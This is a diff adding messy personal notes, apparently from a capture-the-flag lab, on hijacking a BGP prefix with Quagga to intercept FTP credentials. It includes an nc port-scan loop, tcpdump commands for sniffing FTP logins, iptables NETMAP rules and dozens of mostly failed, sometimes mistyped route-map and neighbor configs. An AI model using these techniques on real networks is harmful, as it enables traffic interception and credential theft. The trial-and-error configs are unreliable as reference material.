+B&gt;* 10.120.20.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
+C&gt;* 127.0.0.0/8 is directly connected, lo</p>
+
+<h1 id="router-show-ip-route-10-120-15-0-24">Router# show ip route 10.120.15.0/24</h1>
+
+<p>show ip route 10.120.15.0/24
+Routing entry for 10.120.15.0/24
+  Known via &ldquo;bgp&rdquo;, distance 20, metric 0, best
+  Last update 00:08:16 ago</p>
+
+<ul>
+<li><p>10.78.11.2, via eth2</p></li>
+
+<li></li>
+
+<li><h1 id="router-show-running-config">Router# show running-config</h1>
+
+<pre><code>show running-config
+    
+Current configuration:
+!
+hostname Router
+password zebra
+enable password zebra
+!
+router bgp 100
+ bgp router-id 10.255.255.1
+ network 10.101.8.0/21
+ network 10.101.16.0/21
+ redistribute connected
+ neighbor 10.78.10.2 remote-as 200
+ neighbor 10.78.10.2 route-map to-as200 out
+ neighbor 10.78.11.2 remote-as 300
+ neighbor 10.78.11.2 route-map to-as300 out
+!
+route-map to-as200 permit 10
+!
+route-map to-as300 permit 10
+!
+line vty
+</code></pre>
+
+<p>!</p></li>
+</ul>
+
+<h1 id="arp">arp</h1>
+
+<p>Address                  HWtype  HWaddress           Flags Mask            Iface
+10.99.64.251             ether   00:16:3e:f3:92:14   C                     eth0
+10.78.10.2               ether   00:16:3e:5b:49:a9   C                     eth1
+10.78.11.2               ether   00:16:3e:c4:fa:83   C                     eth2
+10.99.64.1               ether   fe:30:d6:a4:df:a0   C                     eth0</p>
+
+<p>sweet the addresses needed or are theses the address I set. i believe i only need to change the route metric of one of the addresses.</p>
+
+<p>BGP COMMANDS</p>
+
+<h3 id="summary-of-tickets">summary of tickets</h3>
+
+<p>3#  Day 5 customers experience lag</p>
+
+<p>5#  Day unknown a customer calls to report some kind of  CVE maybe bgp hijacking. CVE</p>
+
+<p>6#  Day 38 Castcom calls to report routes being leaked due to &ldquo;misconfiguration&rdquo;. Mike D.was terminated</p>
+
+<p>7#  Day 40 Castcom still reporting issues with 10.120.15.0/24 10.120.16.0/24 10.120.17.0/24</p>
+
+<p>8#  Day 41 Somebody cleared the routes after the leak, fixed by clearing config files.</p>
+
+<p>arp request can&rsquo;t find local address same subnet, changing</p>
+
+<p>Rx / CastCom. IP Engineering team from one of our upstream ISP called to report a problem with some of their routes being leaked again due to a misconfiguration on our end. Update 2018/06/13: Pb solved: Junior Net Engineer Mike D. was terminated yesterday. Updated: 2018/06/15: CastCom. still reporting issues with 3 networks: 10.120.15,10.120.16,10.120.<sup>17</sup>&frasl;<sub>24</sub>&rsquo;s, one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network, investigating&hellip; Updated 2018/06/16: No prbl. found, suspect they had stuck routes after the leak and cleared them manually.</p>
+
+<p>THE ABOVE IS FROM THE WEBPAGE TICKETS found the network i need to connect to.</p>
+
+<p>setting up bgp and zebra</p>
+
+<pre><code>echo &quot;
+!
+hostname Router
+password zebra
+enable password zebra
+!
+&quot; &gt;&gt; zebra.conf.orig
+</code></pre>
+
+<p>copy zebra.conf.orgin into zebra.conf restart quagga</p>
+
+<pre><code>cp zebra.conf.orig zebra.conf
+</code></pre>
+
+<p>restart quagga for the changes to take effect.</p>
+
+<pre><code>/etc/init.d/quagga restart
+</code></pre>
+
+<p>then telnet into zebra the router. i mistakenly used zebra for the bgp changes.  yikes. -l username</p>
+
+<p><div class="notices warning" ><p>[ZEBRA] Unknown command: router bgp autonomous-system</p>
+</div>
+%</p>
+
+<pre><code>telnet localhost zebra
+</code></pre>
+
+<pre><code>echo &quot;
+!
+hostname Router
+password zebra
+enable password zebra
+!
+&quot; &gt;&gt; bgpd.conf.orig
+</code></pre>
+
+<p><div class="notices warning" >Restart is not requeired</div>
+%</p>
+
+<pre><code>cp bgpd.conf.orig bgpd.conf
+</code></pre>
+
+<p>Then telnet into bgp deamon -l username</p>
+
+<pre><code>telnet localhost bgpd -l zebra
+</code></pre>
+
+<div class="notices tip" ><p>Escape character is &lsquo;^]&rsquo;.</p>
+
+<p>Hello, this is Quagga (version 0.99.24.1).
+Copyright 1996-2005 Kunihiro Ishiguro, et al.</p>
+</div>
+
+
+<p>first step defining the autonomous systems.</p>
+
+<pre><code>en      - enable // enter PASS: zebra
+config terminal
+route-map MYMAP permit 10 changes the hop count
+
+</code></pre>
+
+<h2 id="sh-ip-bgp">sh ip bgp</h2>
+
+<p>finding neighbors router#</p>
+
+<pre><code>sh ip bgp
+</code></pre>
+
+<p><img src=".route.PNG" alt="10.route" /></p>
+
+<p>interesting in the above after messing with it for awhile</p>
+
+<pre><code>10.120.15.0/24   10.78.10.2                             0 200 300 i
+*&gt;                          10.78.11.2               0            0        300 i
+</code></pre>
+
+<pre><code>sh ip bgp 10.120.15.0
+sh ip bgp 10.120.15.0
+BGP routing table entry for 10.120.15.0/24
+Paths: (2 available, best #2, table Default-IP-Routing-Table)
+  Advertised to non peer-group peers:
+  10.78.10.2
+  200 300
+    10.78.10.2 from 10.78.10.2 (10.255.255.2)
+      Origin IGP, localpref 100, valid, external
+      Last update: Wed Jan  9 03:22:08 2019
+
+  Local
+    0.0.0.0 from 0.0.0.0 (10.255.255.1)
+      Origin incomplete, metric 0, localpref 100, weight 32768, valid, sourced, best
+      Last update: Wed Jan  9 03:20:06 2019
+</code></pre>
+
+<pre><code>BGP neighbor is 10.78.10.2, remote AS 200, local AS 100, external link
+  BGP version 4, remote router ID 10.255.255.2     
+  BGP state = Established, up for 00:04:02 
+</code></pre>
+
+<pre><code>Connections established 1; dropped 0
+  Last reset never
+Local host: 10.78.10.1, Local port: 179
+Foreign host: 10.78.10.2, Foreign port: 54702
+Nexthop: 10.78.10.1
+Nexthop global: fe80::216:3eff:fe8a:f24f
+Nexthop local: ::
+BGP connection: non shared network
+Read thread: on  Write thread: off
+
+BGP neighbor is 10.78.11.2, remote AS 300, local AS 100, external link
+  BGP version 4, remote router ID 0.0.0.0
+  BGP state = Active
+  Last read 00:04:11, hold time is 180, keepalive interval is 60 seconds
+  Message statistics:
+   Inq depth is 0
+</code></pre>
+
+<pre><code>sudo iptables -t nat -F
+sudo iptables -t nat -A PREROUTING -d 10.78.11.2 -m ttl --ttl-gt 1 -j NETMAP --to 10.120.15.1
+sudo iptables -t nat -A POSTROUTING -s 10.120.15.1 -j NETMAP --to 10.78.11.2
+</code></pre>
+
+<p>in zebra</p>
+
+<p>en</p>
+
+<p>interface eth3</p>
+
+<p>tracepath is for linxu traceroute is for windows duh</p>
+
+<h1 id="tracepath-10-120-15-10">tracepath 10.120.15.10</h1>
+
+<p>why does the local ip repeat? &ldquo;symptom of suboptimal route or load-sharing&rdquo; troubleshooting next-hop table particular route-map/PBR/filters applied to the ip. show cdp neighbor.</p>
+
+<p>1?: [LOCALHOST]                                         pmtu 1500
+ 1:  10.78.11.2                                            0.053ms
+ 1:  10.78.11.2                                            0.021ms
+ 2:  10.120.15.10                                          0.055ms reached
+  Resume: pmtu 1500 hops 2 back 2</p>
+
+<p>ftp 10.120.15.10</p>
+
+<p>Login failed.</p>
+
+<p>TRYING TO UNDERSTAND BGP NEIGHBORS</p>
+
+<p>to enable a tcp connection between two routers they need to neighbors enorder to echange route tables.</p>
+
+<p>en</p>
+
+<p>cronfig terminal</p>
+
+<p>interface eth2</p>
+
+<p><strong>clear ip bgp address</strong></p>
+
+<p><strong>Note:</strong> The  <strong>address</strong>  is the neighbor address.</p>
+
+<p><strong>clear ip bgp *</strong></p>
+
+<p>neighbor 10.120.15.10 remote-as 300</p>
+
+<p>neighbor 10.120.15.1 remote-as 400</p>
+
+<p>network 10.120.0.0/16</p>
+
+<pre><code>NOPE
+RTB# 
+     router bgp 100 
+     neighbor 10.120.15.10 remote-as 300
+</code></pre>
+
+<p>FTP</p>
+
+<p>ftp 10.120.15.10 doesn&rsquo;t work hangs</p>
+
+<p>telnet 10.120.15.10 21</p>
+
+<p>user anonymous</p>
+
+<p>pass anonymous</p>
+
+<p>login successful</p>
+
+<p>get root.txt
+500 HTTP protocol commands not allowed.
+Connection closed by foreign host.</p>
+
+<h3 id="11-capture-ftp-credentials-and-commands">11. Capture FTP Credentials and Commands</h3>
+
+<pre><code>for i in {1..254}; do nc -v -n -z -w 1 10.120.15.$i 21 |grep failed; done
+</code></pre>
+
+<p><img src=".ftp-confirmation.PNG" alt="ftp-confirmation" /></p>
+
+<p>Capturing FTP commands and login details is straight forward. After the authentication is established an FTP session can be <strong>active</strong> or <strong>passive</strong>  this will determine whether the data part of the session is conducted  over TCP port 20 or another ephemeral port. With the following command  you will USER and PASS in the output (which could be fed to grep) as  well as the FTP commands such as LIST, CWD and PASSIVE.</p>
+
+<pre><code>:~$ sudo tcpdump -nn -v port ftp or ftp-data
+</code></pre>
+
+<pre><code>tl
+tcpdump -qns 0 -A -r lo.pcap
+tcpdump -i eth1 -vv -w eth1.pcap
+tcpdump -i any -vv -w any.pcap
+tcpdump -qns 0 -A -r eth1.pcap
+tcpdump -i eth2 -vv -w eth2.pcap
+tcpdump -qns 0 -A -r eth2.pcap
+tcpdump -qns 0 -A -r et2.pcap
+
+-q -s snaplen -n number
+
+trying to change the route-map
+</code></pre>
+
+<p>tried redistributing the localhost, nothing different happened.</p>
+
+<p>eth1</p>
+
+<p>Request who-has 10.78.10.2 tell 10.78.10.1, length 28</p>
+
+<p>23:06:17.303676 ARP, Request who-has 10.78.10.1 tell 10.78.10.2, length 28</p>
+
+<p>23:10:12.439816 IP 10.78.11.2.179 &gt; 10.78.11.1.35546: tcp 0</p>
+
+<p>eth2</p>
+
+<p>23:06:17.303680 ARP, Reply 10.78.10.1 is-at 00:16:3e:8a:f2:4f, length 28</p>
+
+<p>23:06:17.303694 ARP, Reply 10.78.10.2 is-at 00:16:3e:5b:49:a9, length 28</p>
+
+<p>JESUS CHRIST</p>
+
+<p>so after reading the forums everybody says read about bgp leaks which would make since with what we know from the tickets. it&rsquo;s the same site from earlier where i tried to fix 10.120.15.<sup>11</sup>&frasl;<sub>24</sub> network. And tpcdump shows 10.120.15.1 trying to talk around the network but it gets lost can bgp can&rsquo;t establish a connection. i need to fix 10.120.15.<sup>1</sup>&frasl;<sub>24</sub>        / 10.78.10.<sup>1</sup>&frasl;<sub>24</sub></p>
+
+<p>further more local address on eth1 can&rsquo;t talk to eth2 which is silly. they also tlak about loop back leaks but none of the stuff gives me anything i can use.</p>
+
+<p>bgp hijacking not really hakcing your using existing features to make your rogue server the bees knees of routers so all the connection go through it. So to fix the problem or hijack it im not sure what my role is, guess im a hacker so getting ftp creds somehow or use anonymous.</p>
+
+<p>bgp does not use authentication to verify routes. Any BGP router can steal any prefix or modify routes associated with the prefix.</p>
+
+<p>subprefix the attack annouces a subprefix 10.120.15.<sup>1</sup>&frasl;<sub>24</sub> compared to 10.120.0.<sup>1</sup>&frasl;<sub>16</sub></p>
+
+<p>bgpp prefix hijacking is where you take control of a prefix or 10.<sup>1</sup>&frasl;<sub>8</sub></p>
+
+<p>as 100 10.78.0.0/16</p>
+
+<p>as 200 10.100.0.0/16</p>
+
+<p>as 300 10.120.0.0/16</p>
+
+<p><img src="../../Pictures/htb/maps.png" alt="maps" /></p>
+
+<p>eliminating bgpd sub prefix hijacking</p>
+
+<p>try one</p>
+
+<p>router bgp 100</p>
+
+<p>no network 10.78.10.0/24</p>
+
+<p>network 10.78.11.0/24</p>
+
+<p>try two</p>
+
+<p>router bgp 100</p>
+
+<p>no network 10.78.10.1</p>
+
+<p>network 10.78.11.1</p>
+
+<p>try three</p>
+
+<p>router bgp 100</p>
+
+<p>no network 10.78.10.<sup>1</sup>&frasl;<sub>24</sub></p>
+
+<p>network 10.78.11.0/24</p>
+
+<h1 id="fail-4">fail 4</h1>
+
+<pre><code>neighbor 10.120.15.10 remote-as 100
+
+neighbor 10.120.15.10 update-source eth0
+
+neighbor 10.120.15.10 update-source eth1
+
+neighbor 10.120.15.10 update-source loopback
+</code></pre>
+
+<p>neighbor 10.120.15.1 remote-as 100</p>
+
+<p>neighbor 10.120.15.1 remote-as 100</p>
+
+<p>neighbor 10.120.15.1 remote-as 100</p>
+
+<p>network 10.120.0.0</p>
+
+<p>neighbor 10.120.15.1 remote-as 100</p>
+
+<p>neighbor 10.120.15.1 remote-as 300</p>
+
+<p>fail</p>
+
+<p>neighbor 10.120.1.1 remote-as 300</p>
+
+<p>neighbor 10.100.1.1 remote-as 100</p>
+
+<p>neighbor 10.100.1.1 update-source loopback</p>
+
+<p>neighbor 10.100.10.1 remote-as 200</p>
+
+<p>neighbor 10.120.15.1 remote-as 300</p>
+
+<p>network 10.0.0.0</p>
+
+<p>neighbor 10.120.15.1 remote-as 300</p>
+
+<p>neighbor 10.100.10.1 remote-as 200</p>
+
+<p>network 10.120.0.0</p>
+
+<p>neighbor 10.120.15.10 remote-as 300</p>
+
+<p>neighbor 10.120.15.10 distribute-list 1 out</p>
+
+<p>access-list 1 deny 10.120.15.0 255.255.255.0</p>
+
+<p>access-list 1 permit  0.0.0.0 255.255.255.255</p>
+
+<p>neighbor 10.120.15.1 remote-as 300q</p>
+
+<p>neighbor 10.100.0.0 remote-as 200</p>
+
+<p>network 10.120.0.0</p>
+
+<p>neighbor 10.100.10.1 remote-as 200</p>
+
+<p>neighbor 10.120.15.1 remote-as 300</p>
+
+<p>network 10.120.0.0</p>
+
+<p>neighbor 10.100.10.1 remote-as 200</p>
+
+<p>neighbor 10.100.10.1 filter-list 5 weight 100</p>
+
+<p>neighbor 10.100.10.1 filter-list 5 weight 200</p>
+
+<p>neighbor 10.100.10.1 route-map setweightin in</p>
+
+<p>neighbor 10.120.15.1 remote-as 200</p>
+
+<p>neighbor 10.120.15.1 route-map setweightin in</p>
+
+<p>So, recap a vip is trying to ftp to 10.120.15.10 which is 10.120.0.<sup>1</sup>&frasl;<sub>16</sub> as 300</p>
+
+<p>obviously im just poking hole until i get a result. lets just list all the bgp commands and ways that might be relivant.</p>
+
+<h1 id="overview-of-bgp-https-www-cisco-com-c-en-us-support-docs-ip-border-gateway-protocol-bgp-26634-bgp-toc-html-howbgpwork"><a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork">OVERVIEW OF BGP</a></h1>
+
+<p>Boarder Gateway Protocol uses TCP, on port 179. Allows you to create loop-free interdomain routing between ASs. The routers use an exterior gateway protocol to route or an interior gateway protocol. To find the shortest or best way to route information. This below is an overview of failures &amp; hopefully one success.</p>
+
+<h2 id="failed-aggregate-address-10-120-0-0-255-255-0-0-https-www-cisco-com-c-en-us-support-docs-ip-border-gateway-protocol-bgp-26634-bgp-toc-html-cidragg">Failed<a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#cidragg">Aggregate-address 10.120.0.0 255.255.0.0</a></h2>
+
+<p>This helps keep routing tables a little bit cleaner. Aggregation combines multiple routes into one single route. I believe in the context of bgp highjacking this might allow all the traffic to go to me.</p>
+
+<p><a href="https://www.cisco.com/c/dam/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc26.gif"><img src="https://www.cisco.com/c/dam/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc26.gif" alt="bgp-toc26.gif" /></a></p>
+
+<pre><code>try1
+neighbor 10.120.15.1 remote-as 300
+neigbor 10.100.10.1 remote-as 100
+network 10.120.0.0
+aggregate-address 10.120.0.0 255.255.0.0
+try2
+neighbor 10.120.15.1 remote-as 300
+neighbor 10.100.10.0 remote-as 200          
+neighbor 10.120.0.0 remote-as 300       
+neighbor 10.100.0.0 remote-as 200
+
+network 10.120.15.0       
+netowrk 10.100.0.0   
+
+</code></pre>
+
+<h4 id="failed-suppressing-more-specific-routes">Failed - Suppressing more-specific routes</h4>
+
+<p>this fails because ip route 10.120.0.0 255.255.0.0 null0 produces unknown command.</p>
+
+<p>in this senario you ahve three routers as 100 as 300 as 200 the goal is to change the prifix of as 200 to a less speicfic prefix 160.0.0.0. there are some problems doing this i dont fully understand but the work around is using static routes and redistribute into bgp.</p>
+
+<p>Neighbors are routers that have asstablished a connection and share route information.</p>
+
+<p><a href="https://www.cisco.com/c/dam/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc27.gif"><img src="https://www.cisco.com/c/dam/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc27.gif" alt="bgp-toc27.gif" /></a></p>
+
+<pre><code>network 10.120.0.0 mask 255.255.0.0  
+neighbor 10.100.0.0 remote-as 200            
+redistribute static
+ip route 10.120.0.0 255.255.0.0 null0       
+try 2
+neighbor 10.100.0.0 remote-as 200
+neighbor 10.120.0.0 remote-as 300
+network 10.120.15.0
+redistribute static
+try 3
+neighbor 10.78.10.2 remote-as 200
+neighbor 10.78.11.2 remote-as 300
+network 10.120.0.0/16
+redistribute static
+
+</code></pre>
+
+<p><a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#networkcommand">NEIGHBOR COMMAND</a></p>
+
+<p>the neighbor command establish a tcp connection to update routing tables to other autonomous systems.</p>
+
+<p><strong>Note:</strong> You do not need network 150.10.0.0 or network 160.10.0.0 in
+RTC unless you want RTC to generate these networks as well as pass on
+these networks as they come in from AS100 and AS200. Again, the
+difference is that the <strong>network</strong> command adds an extra advertisement for these same networks, which indicates that AS300 is also an origin for these routes.</p>
+
+<p>i believe this is apart of what i need to do, i need to make this route prefered over as 200 to as 300</p>
+
+<p>i want as 200 to as 100 to as 300</p>
+
+<p>this attemped tried to hijack the prefix 10.120.15</p>
+
+<pre><code>neighbor 10.120.15.1 remote-as 300
+
+neighbor 10.100.0.0 remote-as 200
+
+network 10.120.15.0 mask 255.255.255.0
+
+
+</code></pre>
+
+<h2 id="as-path">AS_PATH</h2>
+
+<p>attribute is the list of as number a route has traversed to its destination for as 100 to talk to as 300 it goes through as 200. when it arrives at 300 it looks like 10.120.0.0(300,200) it inverts the as&rsquo;s to know how to get back. note</p>
+
+<p><img src=".route2.PNG" alt="route2" /></p>
+
+<h2 id="next-hop-attribute">Next hop attribute</h2>
+
+<p>Ebgp whats used for AS to route in between other ASs. This allows you to spefify the next hop is within that AS. so you can switch over to ibgp and talk to the next router inside there. hmmm interesting. i dont think its applicaable to this ctf as each of the target routers are in different AS.</p>
+
+<p>BGP Backdoor</p>
+
+<p>eBGP has a distance of 20</p>
+
+<p>distance bgp <em>external-distance internal-distance local-distance</em></p>
+
+<p>distance bgp 20</p>
+
+<p>AS 200 routes directly to AS 300 because thats the shortest path and there for preferred. I want it to go 200 to 100 to 300. distance bgp command to edit the prefered route. this is what i need to get ftp creds. This may not be the way im not sure what kind of internal gateway protocol is being used. Nevermind found it<img src=".igp.PNG" alt="igp" /></p>
+
+<p>one thing that makes this option finicky is that i dont have access to internal gateway protocol. I can only us router bgp. Based on my understand I should be able to bypass this by using the backdoor command.</p>
+
+<p>neighbor 10.120.15.1 remote-as 300</p>
+
+<p>network 10.120.15.1 backdoor</p>
+
+<p>fail</p>
+
+<h2 id="synchronization">Synchronization</h2>
+
+<p>network 10.100.0.0</p>
+
+<p>neighbor 10.120.15.10 remote-as 300</p>
+
+<p>NOTE: This is all about ebgp</p>
+
+<p>no synchronization</p>
+
+<h2 id="weight-attributes">Weight Attributes</h2>
+
+<p>Weight attributes os a cisco-defined attribute hmm. This effects how the router will handle priority with routes. Other paths have a default of zero. Weights range from 0 to 65,535 Default is 32768 (sh ip bgp). routes with higher weights have preference. I don&rsquo;t have access to the router to effect theses changes. which is why i think the attemp with editing the weight attribute failed. This is used when you have two equally awesome routes to take and you need to chooses the preferred way. FOR YOUR ROUTER. forted again.</p>
+
+<p>.<a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork">https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork</a></p>
+
+<p><img src=".metric.PNG" alt="metric" /></p>
+
+<p>neighbor 10.120.0.0 remote-as 300</p>
+
+<p>neighbor 10.100.0.0 remote-as 200</p>
+
+<p>neighbor 10.120.0.0 weight 200</p>
+
+<p>neighbor 10.100.0.0 weight 400</p>
+
+<h2 id="metric-attributes-https-www-cisco-com-c-en-us-support-docs-ip-border-gateway-protocol-bgp-26634-bgp-toc-html-howbgpwork"><a href="**https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork**">METRIC Attributes.</a></h2>
+
+<p>If there are two routers in the same autonoymous system using the mtric attribute will halp external neighbors know which is the prefered path to take. This is a IGBP not really what im looking for. upong rereading about metrics i found this</p>
+
+<p>&ldquo;The attribute provides a dynamic way to influence another AS in the way
+to reach a certain route when there are multiple entry points into that
+AS. A lower metric value is preferred more.</p>
+
+<p>Unlike local preference, metric is exchanged between ASs. A metric is carried into an AS but does not leave the AS. When an update enters the AS with a certain metric, that metric is used to make decisions inside the AS. When the same update passes on to a third AS, that metric returns to 0. The diagram in this section shows the set of metric. The metric default value is 0.&rdquo;</p>
+
+<p>So using route maps i could changes the preferences of as 200</p>
+
+<h2 id="route-filtering-https-www-cisco-com-c-en-us-support-docs-ip-border-gateway-protocol-bgp-26634-bgp-toc-html-howbgpwork"><a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork">ROUTE FILTERING</a></h2>
+
+<p>Not it either this is used when you want to stop the propogation of route to another autonoymous system. fudge</p>
+
+<p><a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#asregexp">https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#asregexp</a></p>
+
+<h2 id="well-well-well-peergroups">Well Well Well PEERGROUPS</h2>
+
+<p><a href="https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#asregexp">https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#asregexp</a></p>
+
+<p>After reading about peergroups the image form docs makes a little more sense.</p>
+
+<p>neighbor castcom peer-group</p>
+
+<p><img src="docs-diagram.PNG" alt="docs-diagram" /></p>
+
+<p>It says i can effect external peer groups it says it can effect the update policies of other AS. which would be nice to shut as 300 up. there by making me the prefered path bauhahahahaa.</p>
+
+<h3 id="cidr-and-aggregate-addresses">CIDR and Aggregate Addresses</h3>
+
+<p>this sounds promising lol. bgpd4 over bgp3 offers cidr notation so like in the above diagram each of  the antonymous systems have aggregated route tables so as 300 broadcast 10.120.0.0/16 and as 200 10.100.0.0/16. i would like to note i saw it appended /21 interesting.</p>
+
+<p>what this does is propogates a supernet route to 10.120.0.0/16</p>
+
+<p>try1</p>
+
+<p>neighbor 10.99.64.2 remote-as 200</p>
+
+<p>neighbor 10.100.10.1 remote-as 200</p>
+
+<p>neighbor 10.120.15.1 remote-as 300</p>
+
+<p>network 10.120.0.0</p>
+
+<p>network 10.78.0.0</p>
+
+<p>aggregate-address 10.120.0.0 255.255.0.0</p>
+
+<p>try 2</p>
+
+<p>network 10.120.0.0 mask 255.255.0.0</p>
+
+<p>neighbor 10.100.10.1 remote-as 300</p>
+
+<p>neighbor 10.100.10.1 remote-as 200</p>
+
+<p>neighbor 10.120.15.1 remote-as 300</p>
+
+<p>redistribute static</p>
+
+<p>try3</p>
+
+<p>neighbor 10.120.15.1 remote-as 300</p>
+
+<p>aggregate 10.120.15.0 255.255.255.0 summary-only</p>
+
+<p>aggregate 10.120.15.0 255.255.255.0 as-set</p>
+
+<h2 id="route-map">ROUTE MAP</h2>
+
+<p>I&rsquo;m not sure why nothing i tried worked. This is how im going to get those creds. Using route map and metrics to change the route prefferences of as 200 to as 300. MEtrics can be used to change the path preferences of other autonomous systems.</p>
+
+<p>network 10.120.0.0</p>
+
+<p>neighbor 10.120.15.1 remote-as 300</p>
+
+<p>network 10.120.0.0</p>
+
+<p>route-map to-as200 permit 20</p>
+
+<p>set metric 5</p>
+
+<p>route-map to-as300 permit 10</p>
+
+<p>neighbor 10.120.15.1 remote-as 300</p>
+
+<p>network 10.120.15.0</p>
+
+<p>route-map to-as200 permit 20</p>
+
+<p>set metric 5</p>
+
+<p>route-map to-as300 permit 10</p>
+
+<p>set metric 2</p>
+
+<p>access-list 1 permit 10.120.0.0 0.0.255.255</p>
+
+<p>neighbor 10.120.15.1 remote-as 300</p>
+
+<p>network 10.120.0.0</p>
+
+<p>route-map to-as300 permit 10</p>
+
+<p>set metric 2</p>
+
+<p>route-map to-as200 permit 20</p>
+
+<p>set metric 5</p>
+
+<p>access-list 1 permit 10.120.0.0 0.0.255.255</p>
+
+<p>neighbor 10.120.15.2 remote-as 300</p>
+
+<p>network 10.120.0.0</p>
+
+<p>route-map to-as200 permit 10</p>
+
+<p>set metric 2</p>
+
+<p>route-map to-as300 permit 20</p>
+
+<p>set metric 5</p>
+
+<p>access-list 1 permit 10.120.0.0 0.0.255.255</p>
+
+<p>try 6</p>
+
+<pre><code>neighbor 10.120.15.1 remote-as 300 
+network 10.120.15.0 
+</code></pre>
+
+<pre><code>neighbor 10.100.10.1 remote-as 200 
+</code></pre>
+
+<pre><code>route-map to-as200 permit 20
+match as-path 1
+set metric 2
+</code></pre>
+
+<pre><code>route-map to-as300 permit 10
+match as-path 1
+set weight 20
+</code></pre>
+
+<pre><code>ip as-path access-list 1 permit ^300$
+ip as-path access-list 1 permit ^100$
+</code></pre>
+
+<h3 id="bgpd-conf">bgpd.conf</h3>
+
+<pre><code>router bgp 100                                                                                                                       
+ bgp router-id 10.255.255.1                                                                                                          
+ network 10.101.8.0/21                                                                                                               
+ network 10.101.16.0/21                                                                                                              
+ redistribute connected                                                                                                              
+ neighbor 10.78.10.2 remote-as 200                                                                                                   
+ neighbor 10.78.11.2 remote-as 300                                                                                                   
+ neighbor 10.78.10.2 route-map to-as200 out                                                                                          
+ neighbor 10.78.11.2 route-map to-as300 out
+</code></pre>
+
+<pre><code>neighbor 10.78.11.2 remote-as 300
+network 10.120.0.0
+This part changes 
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in
+
+route-map to-as200 permit 10
+set metric 2
+
+route-map to-as300 permit 20
+set metric 5
+
+access-list 1 permit 10.120.0.0 0.0.255.255
+</code></pre>
+
+<p>The bgpd.conf file already has an entry for route-map to-as300 permit 10, something to note when you write to the conf file form terminal it will auto arrange the file to the correct format. i had the password at the bottom from the append.</p>
+
+<hr />
+
+<pre><code>
+network 10.120.0.0
+
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in
+
+route-map to-as300 permit 20
+set metric 2
+
+access-list 1 permit 10.120.15.0 0.0.0.255
+
+set weight instead of metric weight doesn't work again because it only 
+affects the local router.
+
+network 10.120.0.0
+
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in
+
+ip as-path access-list 5 permit ^300$
+
+route-map to-as100 permit 10
+set metric 50000
+
+route-map tp-as300 permit 20 
+set metric 30000
+
+you cannot effect other autonomous systems metrics unless you specify bgp always-compare-med 
+
+network 10.120.0.0
+
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in
+
+route-map to-as100 permit 10
+set metric 50000
+
+route-map tp-as300 permit 20 
+set metric 30000
+
+ip as-path access-list 5 permit ^300$
+</code></pre>
+
+<p>to affect other autonomous system metrics  bgp always-compare-med. wooolol</p>
+
+<pre><code>bgp always-compare-med
+
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in
+
+route-map to-as200 permit 20
+set metric 5
+route-map to-as300 permit 10
+set metric 2
+
+access-list 1 permit 10.120.0.0 0.0.255.255
+
+</code></pre>
+
+<p>Next note permit references references different route maps incomming or out going routes. if the first map fail proceed to a higher instance of the route map</p>
+
+<pre><code>bgp always-compare-med
+bgp dampening
+neighbor 10.120.15.1 remote-as 300
+network 10.120.0.0
+
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in
+route-map to-as200 permit 20
+route-map to-as300 permit 20
+set metric 2
+
+access-list 1 permit 10.120.0.0 0.0.255.255
+</code></pre>
+
+<pre><code>bgp always-compare-med
+bgp dampening
+neighbor 10.120.15.1 remote-as 300
+network 10.120.0.0
+
+neighbor 10.78.10.2 route-map to-as200 in
+neighbor 10.78.11.2 route-map to-as300 in
+route-map to-as200 permit 20
+set metric 5
+route-map to-as300 permit 20
+set metric 2
+
+access-list 1 permit 10.120.0.0 0.0.255.255
+</code></pre>
+
+<pre><code>bgp always-compare-med
+network 10.120.15.0
+
+neighbor 10.78.10.1 route-map to-as200 in
+neighbor 10.78.11.1 route-map to-as300 in
+route-map to-as200 permit 20
+set metric 5
+route-map to-as300 permit 20
+match as-path 1
+set metric 2
+
+access-list 1 permit 10.120.15.0 0.0.255.255
+</code></pre>
+
+<p>try adding a match as-path1</p>
+
+<pre><code>router bgp 100
+bgp always-compare-med
+network 10.120.15.0
+neighbor 10.120.15.1 remote-as 300
+
+neighbor 10.78.10.1 route-map to-as200 in
+neighbor 10.78.11.1 route-map to-as300 in
+route-map to-as200 permit 20
+set metric 5
+route-map to-as300 permit 20
+match as-path 1
+set metric 5
+
+ip as-path access-list 1 permit ^300$
+</code></pre>
+
+<p>perhaps ive been over complicating thing.</p>
+
+<pre><code>route-map to-as200 permit 20
+set metric 100
+route-map to-as300 permit 10
+set metric 1
+wr
+router bgp 100
+network 10.120.15.10
+</code></pre>
+
+<pre><code>conf t
+router bgp 100
+bgp always-compare-med
+route-map to-as200 permit 20
+set metric 5
